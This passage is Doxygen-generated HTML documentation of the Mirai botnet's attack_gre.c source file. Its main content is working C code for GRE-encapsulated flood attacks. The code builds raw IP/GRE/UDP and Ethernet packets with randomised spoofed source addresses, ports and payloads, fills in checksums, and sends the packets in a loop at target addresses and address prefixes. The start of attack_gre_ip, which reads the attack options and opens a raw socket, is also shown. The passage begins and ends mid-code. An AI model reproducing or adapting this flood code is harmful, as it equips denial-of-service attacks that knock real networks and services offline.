name="l00260"></a><span class="lineno">  260</span>&#160;            <span class="keyword">struct </span>udphdr *udph = (<span class="keyword">struct </span>udphdr *)(greiph + 1);</div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;            <span class="keywordtype">char</span> *data = (<span class="keywordtype">char</span> *)(udph + 1);</div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;            uint32_t ent1, ent2, ent3;</div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;</div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;</div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;            <span class="keywordflow">if</span> (source_ip == 0xffffffff)</div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;                iph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;</div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;            {</div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;                greiph-&gt;id = ~(iph-&gt;id - 1000);</div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;            }</div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;                udph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;                udph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;</div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;            <span class="keywordflow">if</span> (!gcip)</div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;                greiph-&gt;daddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;            <span class="keywordflow">else</span></div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;                greiph-&gt;daddr = iph-&gt;daddr;</div><div class="line"><a name="l00285"></a><span class="lineno">  285</span>&#160;</div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;            ent1 = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;            ent2 = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;            ent3 = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;            <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(ethh-&gt;h_dest, (<span class="keywordtype">char</span> *)&amp;ent1, 4);</div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;            <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(ethh-&gt;h_source, (<span class="keywordtype">char</span> *)&amp;ent2, 4);</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;            <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(ethh-&gt;h_dest + 4, (<span class="keywordtype">char</span> *)&amp;ent3, 2);</div><div class="line"><a name="l00292"></a><span class="lineno">  292</span>&#160;            <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(ethh-&gt;h_source + 4, (((<span class="keywordtype">char</span> *)&amp;ent3)) + 2, 2);</div><div class="line"><a name="l00293"></a><span class="lineno">  293</span>&#160;</div><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;</div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;            greiph-&gt;check = 0;</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;            greiph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)greiph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;            udph-&gt;check = 0;</div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;            udph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(greiph, udph, udph-&gt;len, sizeof (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;</div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;            targs[i].sock_addr.sin_family = AF_INET;</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;            targs[i].sock_addr.sin_addr.s_addr = iph-&gt;daddr;</div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;            targs[i].sock_addr.sin_port = 0;</div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structgrehdr.html">grehdr</a>) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> ethhdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;        }</div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;        <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;            printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;    }</div><div class="line"><a name="l00318"></a><span class="lineno">  318</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="structgrehdr_html_a97d844ebd5716285f25c57931bc67423"><div class="ttname"><a href="structgrehdr.html#a97d844ebd5716285f25c57931bc67423">grehdr::protocol</a></div><div class="ttdeci">uint16_t protocol</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00022">protocol.h:22</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="rand_8c_html_a11c986f4ca9d396a9bc68c0dd4b3903f"><div class="ttname"><a href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a></div><div class="ttdeci">void rand_str(char *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00032">rand.c:32</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a8654e276185a2f53935614d38f4117f3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a></div><div class="ttdeci">void util_memcpy(void *dst, void *src, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00072">util.c:72</a></div></div>
<div class="ttc" id="attack_8h_html_a47ac28075825da3fec16777b2395f331"><div class="ttname"><a href="attack_8h.html#a47ac28075825da3fec16777b2395f331">ATK_OPT_GRE_CONSTIP</a></div><div class="ttdeci">#define ATK_OPT_GRE_CONSTIP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00065">attack.h:65</a></div></div>
<div class="ttc" id="attack_8h_html_ac8d9ef7cc50e5b0e43f50b087c4c7104"><div class="ttname"><a href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_RAND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00047">attack.h:47</a></div></div>
<div class="ttc" id="attack_8h_html_a9b14feb6720fefac0c6da63a77da718e"><div class="ttname"><a href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a></div><div class="ttdeci">#define ATK_OPT_SOURCE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00071">attack.h:71</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="protocol_8h_html_a2eab7a2ef2f26d9b33693927a6295780"><div class="ttname"><a href="protocol_8h.html#a2eab7a2ef2f26d9b33693927a6295780">PROTO_GRE_TRANS_ETH</a></div><div class="ttdeci">#define PROTO_GRE_TRANS_ETH</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00034">protocol.h:34</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="structgrehdr_html"><div class="ttname"><a href="structgrehdr.html">grehdr</a></div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00021">protocol.h:21</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="af64bc1071be075031eb42fc6635fd5fa"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_gre_ip </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__gre_8c_source.html#l00020">20</a> of file <a class="el" href="attack__gre_8c_source.html">attack_gre.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00065">ATK_OPT_GRE_CONSTIP</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00047">ATK_OPT_PAYLOAD_RAND</a>, <a class="el" href="attack_8h_source.html#l00046">ATK_OPT_PAYLOAD_SIZE</a>, <a class="el" href="attack_8h_source.html#l00071">ATK_OPT_SOURCE</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="protocol_8h_source.html#l00483">data_len</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="protocol_8h_source.html#l00022">grehdr::protocol</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="rand_8c_source.html#l00032">rand_str()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00021"></a><span class="lineno">   21</span>&#160;{</div><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;    <span class="keywordtype">int</span> <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 512);</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> gcip = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a47ac28075825da3fec16777b2395f331">ATK_OPT_GRE_CONSTIP</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    uint32_t source_ip = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>, <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>);</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;    {</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;    }</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;    i = 1;</div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;    {</div><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;    }</div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;</div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;    {</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;        <span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *greh;</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;        <span class="keyword">struct </span>iphdr *greiph;</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;        <span class="keyword">struct </span>udphdr *udph;</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;        pkts[i] = calloc(1510, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)(pkts[i]);</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;        greh = (<span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *)(iph + 1);</div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;        greiph = (<span class="keyword">struct </span>iphdr *)(greh + 1);</div><div class="line"><a name="l00063"></a><span class="lineno">   63</span>&#160;        udph = (<span class="keyword">struct 